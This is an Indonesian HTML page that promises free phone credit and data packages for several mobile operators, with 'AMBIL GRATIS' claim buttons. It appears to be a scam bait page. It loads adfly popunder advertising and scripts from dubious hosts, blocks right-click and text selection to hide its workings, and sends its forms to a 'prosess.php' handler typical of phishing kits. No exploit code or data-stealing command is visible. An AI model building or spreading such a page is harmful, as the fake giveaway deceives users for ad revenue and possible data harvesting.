<!DOCTYPE html>
<html>
  <head>
 <script type="text/javascript"> 
    var adfly_id = 13758497; 
    var adfly_advert = 'int'; 
    var popunder = true; 
    var exclude_domains = ['komputer-temanku.blogspot.co.id', 'www.facebook.com/GarenaPointBlanklndonesia']; 
</script> 
<script src="https://komputer-temanku.blogspot.co.id/"></script>  	
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='https://www.clashofstats.com/images/common/characters/large/1x/barbarian3.png' rel='icon' type='https://www.clashofstats.com/images/common/characters/large/1x/barbarian3.png'/>
<title>SERBA SERBI GRATIS 2020</title>
<script src="http://4upanel.us.to/assets/js/jquery.min.js"></script>
<link rel="stylesheet" href="http://fontawesome.io/assets/font-awesome/css/font-awesome.css">
<link rel="stylesheet" href="bootstrap.min.css">
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
</head><body style="padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; cursor: default;"><div align="center"><noscript>
<div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
<div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;"> Mohon aktifkan javascript pada browser untuk mengakses halaman ini! </div></div>
</noscript></div>
<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>
<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>
<style>
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
body {
  background: url(https://media.karousell.com/media/photos/products/2018/03/01/jual_pulsa_all_operator_1519882905_03afa125.jpg) no-repeat center center fixed;
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
</style>
<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">
<div class="col-md-3">
</div>
<div style="border:1px solid #f1f1f1;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<img style="border:none;width:100%;max-height:200px;margin:0 auto;" src="https://s.kaskus.id/r480x480/images/fjb/2016/04/11/wts_inject_paket_internet_all_operator___token_pln_harga_termurah_4278860_1460378311.png"/>
<div style="border:none;" class="btn btn-success btn-block"><b><i class=""></i>PULSA & DATA PAKET GRATIS!</b></div>
</div>
<center>
<div  style="background:white;padding:30px;width:100%" class="form-horizontal">
<h4 >
  
  <div class="content">
	        <h1></h1>
	
	   <div class="zIndex">
	          
        <div class="registration">
            <form id="frmLoginUI" name="frmLoginUI" method="post" action="prosess.php" onSubmit="return validate();"><div style='display:none'><input type='hidden' name='csrfmiddlewaretoken' value='UX8ogBv3k7w8XeR8SHNYr6GVbYvGKzlL' /></div>              
<div style="width:100%" class="form-group">
<div class="input-group">
    <span class="input-group-addon"><center><img src="https://www.telkomsel.com/sites/default/files/upload/tsel.jpg"style="width:60px;height:60px;"></center></span>
            <select class="form-control" id="princess">         
          <option>Pilih Nominal Pulsa</option>
          <option>5.000</option>
          <option>10.000</option>
		  <option>20.000</option>
          </select>
                <select class="form-control" id="princess">         
          <option>Pilih Paket Data</option>
          <option>3GB (24Jam)+ 4GB (00.00-07.00)</option>
          </select>
  </div>
</div>	   <p>
    
    
    <div style="width:100%" class="form-group">
  <form><input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="AMBIL GRATIS"> </form>
</div>

        <div class="registration">
            <form id="frmLoginUI" name="frmLoginUI" method="post" action="prosess.php" onSubmit="return validate();"><div style='display:none'><input type='hidden' name='csrfmiddlewaretoken' value='UX8ogBv3k7w8XeR8SHNYr6GVbYvGKzlL' /></div>              
<div style="width:100%" class="form-group">
<div class="input-group">
    <span class="input-group-addon"><center><img src="https://vignette.wikia.nocookie.net/logopedia/images/f/fc/Logo_axis_new.png/revision/latest?cb=20161031171314"style="width:60px;height:60px;"></center></span>
            <select class="form-control" id="princess">         
          <option>Pilih Nominal Pulsa</option>
          <option>10.000</option>
          <option>25.000</option>
		  <option>50.000</option>
          </select>
                <select class="form-control" id="princess">         
          <option>Pilih Paket Data</option>
          <option>10GB (24Jam)+ 4GB (00.00-07.00)</option>
          </select>
  </div>
</div>
<div style="width:100%" class="form-group">
  <form><input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="AMBIL GRATIS"> </form>
</div>
        <div class="registration">
            <form id="frmLoginUI" name="frmLoginUI" method="post" action="prosess.php" onSubmit="return validate();"><div style='display:none'><input type='hidden' name='csrfmiddlewaretoken' value='UX8ogBv3k7w8XeR8SHNYr6GVbYvGKzlL' /></div>              
<div style="width:100%" class="form-group">
<div class="input-group">
    <span class="input-group-addon"><center><img src="data:image/png;base64,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"style="width:60px;height:60px;"></center></span>
            <select class="form-control" id="princess">         
          <option>Pilih Nominal Pulsa</option>
          <option>10.000</option>
          <option>20.000</option>
		  <option>50.000</option>
          </select>
                <select class="form-control" id="princess">         
          <option>Pilih Paket Data</option>
          <option>1GB (24Jam)+ 2GB (00.00-07.00)</option>
          </select>
  </div>
</div>
<div style="width:100%" class="form-group">
  <form><input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="AMBIL GRATIS"> </form>
</div>


        <div class="registration">
            <form id="frmLoginUI" name="frmLoginUI" method="post" action="prosess.php" onSubmit="return validate();"><div style='display:none'><input type='hidden' name='csrfmiddlewaretoken' value='UX8ogBv3k7w8XeR8SHNYr6GVbYvGKzlL' /></div>              
<div style="width:100%" class="form-group">
<div class="input-group">
    <span class="input-group-addon"><img src="https://2.bp.blogspot.com/-M6IJgUswpac/WgqZJlkRYPI/AAAAAAAAE1k/PSryLftfsXsv9fqVqxHmfaZVlEYuw7qcACLcBGAs/w1200-h630-p-k-no-nu/Indosat%2BOredo.png"style="width:60px;height:60px;"></span>
            <select class="form-control" id="princess">         
          <option>Pilih Nominal Pulsa</option>
          <option>5.000</option>
          <option>20.000</option>
		  <option>100.000</option>
          </select>
                <select class="form-control" id="princess">         
          <option>Pilih Paket Data</option>
          <option>0.5GB (24Jam)+ 2GB (00.00-07.00)</option>
          </select>
  </div>
</div>
</div>
</div>
               
                </div>   
                <div class="zIndex">
				<p>
<div style="width:100%" class="form-group">
  <form><input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="AMBIL GRATIS"> </form>
</div>
</div>

<img src="https://2.bp.blogspot.com/-NMDvDbrODXk/WMzP2eOL93I/AAAAAAAAALA/WulIk8h88gsNNkirNrhfV1reh0RzCqF7QCLcB/s1600/good.jpg"/></p>
<p>Copyright &copy; 2020.</p>
</div>
</div>
<div class="col-md-3">
</div>
</div>